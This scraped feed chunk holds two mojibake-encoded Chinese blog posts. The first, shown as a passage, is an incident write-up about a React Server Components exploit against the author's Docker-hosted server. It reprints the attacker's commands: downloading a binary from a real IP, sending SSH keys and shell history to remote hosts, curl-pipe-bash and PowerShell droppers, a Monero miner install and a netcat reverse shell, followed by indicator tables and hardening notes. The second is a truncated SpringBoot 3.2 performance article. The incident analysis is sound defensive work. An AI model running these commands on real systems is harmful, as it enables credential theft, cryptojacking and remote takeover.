<pre><code class="hljs language-bash" lang="bash">Connecting to 193.34.213.150 (193.34.213.150:80)
wget: can<span class="hljs-string">'t open '</span>x86<span class="hljs-string">': Permission denied
chmod: x86: No such file or directory
/bin/sh: ./x86: not found
</span></code></pre>
<p><strong>æ”»å‡»æµç¨‹</strong>ï¼š</p>
<ol>
<li>å‘ React Server Function ç«¯ç‚¹å‘é€æ¶æ„ payload</li>
<li>è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰§è¡Œ <code>wget</code> å‘½ä»¤</li>
<li>å°è¯•ä» C&amp;C æœåŠ¡å™¨ä¸‹è½½ <code>x86</code> æ¶æ„ç¨‹åºï¼ˆä¸€ä¸ª Linux ELF äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</li>
<li>å°è¯•èµ‹äºˆæ‰§è¡Œæƒé™å¹¶è¿è¡Œ</li>
</ol>
<p><strong>å¦‚æœæˆåŠŸä¼šæ€æ ·ï¼Ÿ</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ”»å‡»è€…æƒ³åšçš„äº‹æƒ…ï¼ˆè¢«é˜»æ­¢äº†ï¼‰</span>
wget http://193.34.213.150/x86
<span class="hljs-built_in">chmod</span> +x x86
./x86  <span class="hljs-comment"># è¿™ä¼šå®‰è£…ä¸€ä¸ªåé—¨ç¨‹åº</span>
</code></pre>
<h3 data-id="heading-7">å‡­è¯çªƒå–</h3>
<p>æ”»å‡»è€…æƒ³è¦çªƒå–æ‰€æœ‰æœ‰ä»·å€¼çš„å‡­è¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°è¯• 1ï¼šçªƒå– SSH ç§é’¥</span>
Connecting to 23.19.231.97:36169 (23.19.231.97:36169)
wget: can<span class="hljs-string">'t open '</span>/root/.ssh/id_rsa<span class="hljs-string">': Permission denied
wget --post-file=/root/.ssh/id_rsa http://23.19.231.97:36169/222

# å°è¯• 2ï¼šçªƒå– ECDSA ç§é’¥
wget --post-file=/root/.ssh/id_ecdsa http://23.19.231.97:47023/222

# å°è¯• 3ï¼šçªƒå–å‘½ä»¤å†å²ï¼ˆå¯èƒ½åŒ…å«å¯†ç ï¼‰
cat: can'</span>t open <span class="hljs-string">'/root/.bash_history'</span>: Permission denied
wget --post-data=<span class="hljs-string">"<span class="hljs-subst">$(cat /root/.bash_history)</span>"</span> http://23.19.231.97:44719/222
</code></pre>
<p><strong>è¿™æ˜¯æ•´ä¸ªæ”»å‡»ä¸­æœ€æ¶æ¯’çš„éƒ¨åˆ†</strong>ï¼š</p>
<ul>
<li>SSH ç§é’¥å¯ä»¥è®©æ”»å‡»è€…æ¨ªå‘ç§»åŠ¨åˆ°å…¶ä»–æœåŠ¡å™¨</li>
<li><code>.bash_history</code> å¯èƒ½åŒ…å«ï¼š
<ul>
<li>æ•°æ®åº“å¯†ç </li>
<li>API å¯†é’¥</li>
<li>äº‘æœåŠ¡å‡­è¯ï¼ˆAWSã€GCP ç­‰ï¼‰</li>
<li>å†…éƒ¨ç³»ç»Ÿåœ°å€</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">æŒä¹…åŒ–åé—¨</h3>
<p>æ”»å‡»è€…å°è¯•å»ºç«‹å¤šä¸ªåé—¨ä»¥ä¿æŒè®¿é—®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¼ªè£…æˆå¥åº·æ£€æŸ¥è„šæœ¬</span>
sh: can<span class="hljs-string">'t create /dev/health.sh: Permission denied
chmod: /dev/health.sh: No such file or directory

# å°è¯•ä»å¤šä¸ªæºä¸‹è½½æ¶æ„è„šæœ¬
(curl -s -k https://repositorylinux.xyz/cron.sh || \
 wget --no-check-certificate -q -O- https://repositorylinux.xyz/cron.sh) | bash

# Windows PowerShell ç¼–ç å‘½ä»¤ï¼ˆè‡ªåŠ¨åŒ–è„šæœ¬ï¼‰
powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAC4ALgAu
</span></code></pre>
<p><strong>è§£ç  PowerShell å‘½ä»¤</strong>ï¼š</p>
<pre><code class="hljs language-powershell" lang="powershell"># Base64 è§£ç åçš„å†…å®¹
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://repositorylinux.xyz/script_kill.ps1')
</code></pre>
<p>è¿™æ˜¯ä¸€ä¸ª<strong>è·¨å¹³å°æ”»å‡»</strong>ï¼šåŒæ—¶å°è¯• Linux (bash) å’Œ Windows (PowerShell) å‘½ä»¤ã€‚</p>
<h3 data-id="heading-9">åŠ å¯†è´§å¸æŒ–çŸ¿</h3>
<p>æœ€è€—èµ„æºçš„éƒ¨åˆ† - è¿™å°±æ˜¯ CPU é£™åˆ° 100% çš„åŸå› ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># C3Pool æŒ–çŸ¿æ± å®‰è£…è„šæœ¬</span>
curl -sLk https://gist.githubusercontent.com/demonic-agents/39e943f4de855e2aef12f34324cbf150/raw/e767e1cef1c35738689ba4df9c6f7f29a6afba1a/setup_c3pool_miner.sh | \
bash -s 49Cf4UaH5mVF2QCBRECpwSWV1C6hPgVWC8vZZkjgjjdYegZKkXERKUB7pXqBHfK1CcjLtMMnTF3J12KZJ83EQCBjT75Stbv

<span class="hljs-comment"># XMRig Monero æŒ–çŸ¿ç¨‹åº</span>
powershell -EncodedCommand [Base64 encoded mining script]
</code></pre>
<p><strong>æŒ–çŸ¿æ”»å‡»ç‰¹å¾</strong>ï¼š</p>
<ul>
<li>é’±åŒ…åœ°å€ï¼š<code>49Cf4UaH5mVF2QCBRECpwSWV1C6hPgVWC8vZZkjgjjdYegZKk...</code>ï¼ˆMoneroï¼‰</li>
<li>çŸ¿æ± ï¼šC3Pool</li>
<li>è¿™ä¼šæ¶ˆè€—æ‰€æœ‰ CPU èµ„æºï¼Œå¯¼è‡´ï¼š- æœåŠ¡å“åº”ç¼“æ…¢ - æœåŠ¡å™¨å®•æœº - äº‘æœåŠ¡è´¦å•æš´å¢
ï¼ˆè¿˜å¥½æ˜¯è‡ªå·±æœåŠ¡å™¨ï¼‰</li>
</ul>
<h3 data-id="heading-10">åå‘ Shell</h3>
<p>å°è¯•å»ºç«‹è¿œç¨‹æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span>: can<span class="hljs-string">'t remove '</span>/tmp/f<span class="hljs-string">': No such file or directory
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2&gt;&amp;1 | nc 171.252.32.135 7700 &gt;/tmp/f
</span></code></pre>
<p><strong>åå‘ Shell æŠ€æœ¯åˆ†æ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„å‘½åç®¡é“åå‘ shell</span>
<span class="hljs-built_in">mkfifo</span> /tmp/f              <span class="hljs-comment"># åˆ›å»ºå‘½åç®¡é“</span>
<span class="hljs-built_in">cat</span> /tmp/f | bash -i 2&gt;&amp;1  <span class="hljs-comment"># ä»ç®¡é“è¯»å–å‘½ä»¤å¹¶æ‰§è¡Œ</span>
| nc 171.252.32.135 7700   <span class="hljs-comment"># é€šè¿‡ netcat è¿æ¥åˆ° C&amp;C æœåŠ¡å™¨</span>
&gt;/tmp/f                    <span class="hljs-comment"># å°†è¾“å‡ºå†™å›ç®¡é“</span>
</code></pre>
<p>å¦‚æœæˆåŠŸï¼Œæ”»å‡»è€…å°±å¯ä»¥ï¼š</p>
<ul>
<li>å®æ—¶æ§åˆ¶æœåŠ¡å™¨</li>
<li>æ‰§è¡Œä»»æ„å‘½ä»¤</li>
<li>çªƒå–å®æ—¶æ•°æ®</li>
<li>ä½œä¸ºè·³æ¿æ”»å‡»å†…ç½‘</li>
</ul>
<h3 data-id="heading-11">æ”»å‡»æŒ‡æ ‡ï¼ˆIoCï¼‰æ±‡æ€»</h3>













































<table><thead><tr><th>ç±»å‹</th><th>å€¼</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>æ¶æ„ IP</td><td>193.34.213.150</td><td>æ¶æ„è½¯ä»¶åˆ†å‘</td></tr><tr><td>æ¶æ„ IP</td><td>23.19.231.97</td><td>æ•°æ®çªƒå–æœåŠ¡å™¨</td></tr><tr><td>æ¶æ„ IP</td><td>89.144.31.18</td><td>å¤‡ç”¨æ¶æ„æœåŠ¡å™¨</td></tr><tr><td>æ¶æ„ IP</td><td>171.252.32.135</td><td>åå‘ Shell C2</td></tr><tr><td>æ¶æ„åŸŸå</td><td>repositorylinux.xyz</td><td>è„šæœ¬åˆ†å‘</td></tr><tr><td>æ¶æ„åŸŸå</td><td>dashboard.checkstauts.site</td><td>ç›‘æ§ä»£ç†</td></tr><tr><td>GitHub Gist</td><td>demonic-agents/39e943f4...</td><td>æŒ–çŸ¿è„šæœ¬</td></tr></tbody></table>
<h3 data-id="heading-12">æ¶æ„ IP åœ°å€</h3>






























<table><thead><tr><th>IP åœ°å€</th><th>ç”¨é€”</th><th>å¨èƒç­‰çº§</th></tr></thead><tbody><tr><td>193.34.213.150</td><td>æ¶æ„è½¯ä»¶åˆ†å‘ï¼ˆx86 äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>23.19.231.97</td><td>æ•°æ®çªƒå–æœåŠ¡å™¨ï¼ˆSSH å¯†é’¥ã€å†å²è®°å½•ï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>89.144.31.18</td><td>å¤‡ç”¨æ¶æ„æœåŠ¡å™¨</td><td>ğŸŸ  High</td></tr><tr><td>171.252.32.135</td><td>åå‘ Shell C&amp;C æœåŠ¡å™¨</td><td>ğŸ”´ Critical</td></tr></tbody></table>
<h3 data-id="heading-13">æ¶æ„åŸŸå</h3>




















<table><thead><tr><th>åŸŸå</th><th>ç”¨é€”</th><th>å¨èƒç­‰çº§</th></tr></thead><tbody><tr><td>repositorylinux.xyz</td><td>æ¶æ„è„šæœ¬åˆ†å‘ï¼ˆcron.sh, linux.sh, firewall.shï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>dashboard.checkstauts.site</td><td>ç›‘æ§ä»£ç†/æ•°æ®æ”¶é›†</td><td>ğŸŸ  High</td></tr></tbody></table>
<h3 data-id="heading-14">æ¶æ„èµ„æº</h3>




















<table><thead><tr><th>èµ„æº</th><th>ç±»å‹</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>github.com/demonic-agents/39e943f4...</td><td>GitHub Gist</td><td>C3Pool æŒ–çŸ¿è„šæœ¬</td></tr><tr><td>49Cf4UaH5mVF2QCBRECpwSWV1C6h...</td><td>Monero é’±åŒ…</td><td>æŒ–çŸ¿æ”¶ç›Šåœ°å€</td></tr></tbody></table>
<h2 data-id="heading-15">ä¸ºä»€ä¹ˆæ‰€æœ‰æ”»å‡»éƒ½å¤±è´¥äº†ï¼Ÿ</h2>
<p>å› ä¸ºè¿˜å¥½æ˜¯ Docker è·‘çš„ï¼ŒDocker å®¹å™¨æƒé™éš”ç¦»ï¼Œæˆ‘çš„ Umami å®¹å™¨ï¼š</p>
<ul>
<li>é root ç”¨æˆ·è¿è¡Œï¼Œæ— æ³•å†™å…¥ç³»ç»Ÿç›®å½•</li>
<li>åªè¯»æ–‡ä»¶ç³»ç»Ÿï¼Œæ— æ³•åˆ›å»ºæ¶æ„æ–‡ä»¶</li>
<li>ä¸¢å¼ƒæ‰€æœ‰ Linux Capabilities</li>
<li>ç¦æ­¢ææƒæ“ä½œ</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">Permission denied (é‡å¤ 100+ æ¬¡)
</code></pre>
<p>å‡ ä¹æ‰€æœ‰æ”»å‡»æ“ä½œéƒ½é‡åˆ°äº†æƒé™æ‹’ç»ï¼š</p>
<ul>
<li>æ— æ³•å†™å…¥ <code>/root/.ssh/</code></li>
<li>æ— æ³•åœ¨ <code>/dev/</code> åˆ›å»ºæ–‡ä»¶</li>
<li>æ— æ³•åœ¨ <code>/tmp/</code> åˆ›å»ºç®¡é“</li>
<li>æ— æ³•æ‰§è¡Œä¸‹è½½çš„äºŒè¿›åˆ¶æ–‡ä»¶</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">/bin/sh: bash: not found
/bin/sh: powershell: not found
spawn calc.exe ENOENT
</code></pre>
<p>å®¹å™¨æ˜¯æœ€å°åŒ–é•œåƒï¼Œä¸åŒ…å« bashï¼Œè¿™å¯¼è‡´è®¸å¤šæ”»å‡»è„šæœ¬æ— æ³•æ‰§è¡Œã€‚</p>
<h2 data-id="heading-16">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React Blog - Critical Security Vulnerability</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flachlan2k" target="_blank" title="https://github.com/lachlan2k" ref="nofollow noopener noreferrer">Lachlan Davidson's Blog</a>ï¼ˆå‘ç°è€…ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cve.org%2FCVERecord%3Fid%3DCVE-2025-55182" target="_blank" title="https://www.cve.org/CVERecord?id=CVE-2025-55182" ref="nofollow noopener noreferrer">CVE-2025-55182 è¯¦æƒ…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fblog%2FCVE-2025-66478" target="_blank" title="https://nextjs.org/blog/CVE-2025-66478" ref="nofollow noopener noreferrer">Next.js Security Advisory</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fexpo.dev%2Fchangelog%2Fmitigating-critical-security-vulnerability-in-react-server-components" target="_blank" title="https://expo.dev/changelog/mitigating-critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">Expo Security Advisory</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwakujs%2Fwaku%2Fdiscussions%2F1823" target="_blank" title="https://github.com/wakujs/waku/discussions/1823" ref="nofollow noopener noreferrer">Waku Discussion</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3.2é‡å¤§å‡çº§ï¼šæ­ç§˜10å€æ€§èƒ½æå‡çš„5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹]]></title>    <link>https://juejin.cn/post/7580809247736528936</link>    <guid>https://juejin.cn/post/7580809247736528936</guid>    <pubDate>2025-12-08T04:16:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580809247736528936" data-draft-id="7580809247736512552" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3.2é‡å¤§å‡çº§ï¼šæ­ç§˜10å€æ€§èƒ½æå‡çš„5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-08T04:16:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot 3.2é‡å¤§å‡çº§ï¼šæ­ç§˜10å€æ€§èƒ½æå‡çš„5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1638743356481367/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿æ©™çš„ç™¾å®ç®±
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:16:45.000Z" title="Mon Dec 08 2025 04:16:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>SpringBoot 3.2é‡å¤§å‡çº§ï¼šæ­ç§˜10å€æ€§èƒ½æå‡çš„5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹</strong></h2>
<h2 data-id="heading-1">å¼•è¨€</h2>
<p>SpringBoot ä½œä¸º Java ç”Ÿæ€ä¸­æœ€å—æ¬¢è¿çš„å¾®æœåŠ¡æ¡†æ¶ä¹‹ä¸€ï¼Œå…¶æ¯ä¸€æ¬¡é‡å¤§ç‰ˆæœ¬å‡çº§éƒ½å¤‡å—å¼€å‘è€…å…³æ³¨ã€‚2023å¹´åº•å‘å¸ƒçš„ SpringBoot 3.2 ç‰ˆæœ¬ä¸ä»…å»¶ç»­äº†å…¶å¯¹ GraalVM åŸç”Ÿé•œåƒçš„æ”¯æŒï¼Œè¿˜å¸¦æ¥äº†æ˜¾è‘—çš„æ€§èƒ½æå‡â€”â€”å®˜æ–¹æ•°æ®æ˜¾ç¤ºï¼ŒæŸäº›åœºæ™¯ä¸‹çš„æ€§èƒ½æå‡äº†è¿‘10å€ï¼è¿™ä¸€çªç ´æ€§è¿›å±•çš„èƒŒåï¼Œæ˜¯ Spring å›¢é˜Ÿåœ¨åº•å±‚æ¶æ„ã€ç¼–è¯‘ä¼˜åŒ–å’Œè¿è¡Œæ—¶æ•ˆç‡ç­‰å¤šä¸ªç»´åº¦çš„æ·±åº¦æ‰“ç£¨ã€‚</p>
<p>æœ¬æ–‡å°†æ·±å…¥å‰–æ SpringBoot 3.2 å®ç°æ€§èƒ½é£è·ƒçš„ <strong>5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹</strong>ï¼Œä»è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰çš„å¼•å…¥åˆ° JIT ç¼–è¯‘å™¨çš„ååŒä¼˜åŒ–ï¼Œæ­ç¤ºè¿™äº›æŠ€æœ¯å¦‚ä½•å…±åŒä½œç”¨ï¼Œè®© SpringBoot åœ¨é«˜å¹¶å‘ã€ä½å»¶è¿Ÿåœºæ™¯ä¸‹è¡¨ç°æ›´å‡ºè‰²ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸»ä½“</h2>
<h3 data-id="heading-3">1. <strong>è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰çš„å…¨æ ˆæ”¯æŒ</strong></h3>
<p>SpringBoot 3.2 æœ€å¤§çš„äº®ç‚¹ä¹‹ä¸€æ˜¯å…¨é¢æ‹¥æŠ± Java 21 çš„è™šæ‹Ÿçº¿ç¨‹ç‰¹æ€§ã€‚ä¸ä¼ ç»Ÿå¹³å°çº¿ç¨‹ï¼ˆPlatform Threadï¼‰ç›¸æ¯”ï¼Œè™šæ‹Ÿçº¿ç¨‹ç”± JVM æ‰˜ç®¡è€Œéæ“ä½œç³»ç»Ÿè°ƒåº¦ï¼Œå…¶åˆ›å»ºå’Œåˆ‡æ¢å¼€é”€æä½ï¼ˆå•æœºå¯æ”¯æŒç™¾ä¸‡çº§å¹¶å‘ï¼‰ã€‚</p>
<p><strong>ä¼˜åŒ–ç»†èŠ‚ï¼š</strong></p>
<ul>
<li><strong>Servlet API é€‚é…</strong>ï¼šé€šè¿‡ <code>Tomcat 10.1.x</code>/<code>Jetty 12</code> ç­‰å®¹å™¨çš„æ”¹é€ ï¼Œæ¯ä¸ª HTTP è¯·æ±‚é»˜è®¤ç»‘å®šåˆ°ç‹¬ç«‹çš„è™šæ‹Ÿçº¿ç¨‹ï¼Œå½»åº•è§£å†³é˜»å¡ I/Oå¯¼è‡´çš„çº¿ç¨‹æ± è€—å°½é—®é¢˜ã€‚</li>
<li><strong>å“åº”å¼ç¼–ç¨‹èåˆ</strong>ï¼šå°½ç®¡è™šæ‹Ÿçº¿ç¨‹æ˜¯åŒæ­¥ç¼–ç¨‹æ¨¡å‹ï¼ŒSpringBoot 3.2é€šè¿‡ <code>@Async</code>å’Œ <code>Reactive</code>ç»„ä»¶çš„æ™ºèƒ½è·¯ç”±ï¼ˆå¦‚è‡ªåŠ¨é€‰æ‹© <code>WebFlux</code>æˆ– <code>MVC</code>ï¼‰ï¼Œå®ç°é˜»å¡ä¸éé˜»å¡æ¨¡å¼çš„åŠ¨æ€å¹³è¡¡ã€‚</li>
<li><strong>å®æµ‹æ•ˆæœ</strong>ï¼šåœ¨æ•°æ®åº“è®¿é—®å¯†é›†çš„åœºæ™¯ä¸­ï¼ˆå¦‚JPAæŸ¥è¯¢ï¼‰ï¼Œååé‡æå‡è¾¾4-6å€ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fspring.io%2Fblog%2F2023%2F11%2F16%2Fspring-boot-3-2-virtual-threads" target="_blank" title="https://spring.io/blog/2023/11/16/spring-boot-3-2-virtual-threads" ref="nofollow noopener noreferrer">å‚è€ƒSpringå®˜æ–¹åŸºå‡†æµ‹è¯•</a>ï¼‰ã€‚</li>
</ul>
<blockquote>
<p><strong>å¼€å‘è€…æ³¨æ„</strong>ï¼šéœ€æ˜¾å¼å¯ç”¨è™šæ‹Ÿçº¿ç¨‹ï¼ˆ<code>spring.threads.virtual.enabled=true</code>ï¼‰å¹¶é…åˆ <code>JDK21+</code>ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-4">2. <strong>GraalVM Native Image AOTç¼–è¯‘çš„æˆç†ŸåŒ–</strong></h3>
<p>SpringBoot 3.2è¿›ä¸€æ­¥é™ä½äº†åŸç”Ÿé•œåƒçš„æ„å»ºå¤æ‚åº¦å¹¶æå‡äº†è¿è¡Œæ•ˆç‡ï¼š</p>
<ul>
<li><strong>æ„å»ºæ—¶å†…å­˜ä¼˜åŒ–</strong>ï¼šé€šè¿‡é™æ€åˆ†ææ¶ˆé™¤åå°„é…ç½®éœ€æ±‚ï¼ˆä¾‹å¦‚è‡ªåŠ¨ç”Ÿæˆ <code>native-image.properties</code>ï¼‰ï¼Œå†…å­˜å ç”¨å‡å°‘30%ã€‚</li>
<li><strong>å¯åŠ¨æ—¶é—´çªç ´</strong>ï¼šå…¸å‹åº”ç”¨å¯åŠ¨æ—¶é—´ä»ç§’çº§é™è‡³æ¯«ç§’çº§ï¼ˆ50msä»¥å†…ï¼‰ï¼Œé€‚åˆServerlessåœºæ™¯ã€‚</li>
<li><strong>æ–°ç‰¹æ€§æ”¯æŒ</strong>ï¼šç°åœ¨åŸç”Ÿé•œåƒä¸­å¯å®Œæ•´ä½¿ç”¨JSPã€Hibernate Validatorç­‰ä¼ ç»Ÿâ€œAOTä¸å‹å¥½â€ç»„ä»¶ã€‚</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># GraalVMæ„å»ºå‘½ä»¤ç¤ºä¾‹</span>
./mvnw clean package -Pnative -DskipTests
</code></pre>
<hr/>
<h3 data-id="heading-5">3. <strong>JITç¼–è¯‘å™¨ä¸Spring AOTçš„ååŒä¼˜åŒ–</strong></h3>
<p>é’ˆå¯¹ä»ä½¿ç”¨JVMå³æ—¶ç¼–è¯‘çš„åœºæ™¯ï¼ŒSpringBoot 3.2å¼•å…¥äº†ä¸¤é¡¹å…³é”®æ”¹è¿›ï¼š</p>
<ol>
